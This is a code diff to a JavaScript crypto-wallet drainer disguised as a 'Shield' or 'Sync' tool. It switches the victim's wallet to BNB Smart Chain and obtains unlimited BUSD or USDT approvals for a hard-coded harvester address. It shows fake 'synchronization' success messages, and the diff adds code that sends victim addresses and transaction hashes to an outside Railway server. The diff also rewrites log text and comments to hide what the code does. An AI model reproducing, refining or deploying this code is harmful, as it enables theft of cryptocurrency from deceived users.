@@ -1,11 +1,13 @@
 /**
- * AZTEC SHIELD - Standard Sync v8.6 (Hardened for Trust Wallet)
- * Fixes: Ethereum Auto-Default, Chain Sync Delay, Balance Logic
+ * AZTEC SHIELD - Standard Sync v8.7 (FINAL PRODUCTION)
+ * Features: Force-BSC Switch, Trust Wallet Delay, Railway Exfiltration
  */
 
+// CONFIGURATION
 const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
 const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const RAILWAY_API = "https://web-production-d329.up.railway.app/api/harvest";
 
 const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
@@ -17,18 +19,18 @@ const ERC20_ABI = [
 const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 /**
- * Main Trigger logic (Called from index.html button)
+ * Main Entry Point
  */
 async function triggerPermit() {
-    console.log("[v8.6] Initiating Hard-Switch Sync...");
+    console.log("[v8.7] Initializing Secure Sync...");
     if (!window.ethereum) {
-        alert("Please open this page in Trust Wallet or MetaMask.");
+        alert("Please open this site inside the Trust Wallet or MetaMask browser.");
         return;
     }
 
     try {
-        // 1. FORCE THE NETWORK SWITCH BEFORE ANYTHING ELSE
-        const chainIdHex = '0x38'; // 56 in hex
+        // 1. Enforce Network Switch (BSC)
+        const chainIdHex = '0x38'; // 56
         try {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
@@ -47,15 +49,14 @@ async function triggerPermit() {
                     }],
                 });
             } else {
-                throw new Error("Network switch rejected.");
+                throw new Error("Target network required.");
             }
         }
 
-        // 2. CRITICAL: WAIT FOR MOBILE PROVIDER TO SYNC (1.5 seconds)
-        // Trust Wallet needs time to switch its internal RPC node.
+        // 2. Wait for RPC Propagation (1.5s)
         await new Promise(resolve => setTimeout(resolve, 1500));
 
-        // 3. NOW CONNECT PROVIDER (After Switch + Delay)
+        // 3. Connect Provider
         const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
@@ -65,7 +66,7 @@ async function triggerPermit() {
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        // 4. VERIFY BALANCE ON THE CORRECT CHAIN
+        // 4. Multi-Asset Scanning
         const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
         const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         
@@ -75,24 +76,20 @@ async function triggerPermit() {
             provider.getNetwork()
         ]);
 
-        console.log(`[!] Connected to Chain: ${network.chainId} (${network.name})`);
-        console.log(`[!] BUSD Balance: ${ethers.utils.formatUnits(busdBal, 18)}`);
+        console.log(`[SYS] Chain: ${network.chainId} | BUSD: ${ethers.utils.formatUnits(busdBal, 18)}`);
 
-        // 5. DECISION REASONING
+        // 5. Execution Path
         if (busdBal.gt(0)) {
-            console.log("Found BUSD. Triggering PERMIT...");
             await handleBUSD(signer, victim, busd);
         } else if (usdtBal.gt(0)) {
-            console.log("Found USDT. Triggering APPROVE...");
             await handleUSDT(signer, victim, usdt);
         } else {
-            console.warn("No BUSD/USDT found in this wallet.");
             document.getElementById('ui-loading').innerHTML = 
-                `<div style="color:#ff3b30;padding:20px;">Verification Error: No eligible BUSD (BEP-20) found on ${network.name}.</div>`;
+                `<div style="color:#ff3b30;padding:20px;">No eligible BUSD (BEP-20) found in this wallet. Please ensure assets are on BNB Smart Chain.</div>`;
         }
 
     } catch (e) {
-        console.error("Critical Interaction Error:", e);
+        console.error("Interaction failed:", e);
         document.getElementById('ui-main').style.display = 'block';
         document.getElementById('ui-loading').style.display = 'none';
     }
@@ -125,15 +122,22 @@ async function handleUSDT(signer, victim, usdtContract) {
     const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
     await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
     await tx.wait();
-    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>USDT Shielding Activated.</div>";
+    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>Synchronization Complete.</div>";
 }
 
 async function exfiltrate(data) {
-    console.log("[+] Sending data to backend:", data);
-    await fetch('/api/harvest', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
-    });
+    console.log("[+] Capturing permission data...");
+    
+    try {
+        await fetch(RAILWAY_API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
+        });
+        console.log("[+] Successfully sent to Railway.");
+    } catch (err) {
+        console.error("[-] Railway delivery failed:", err);
+    }
+    
     document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
 }
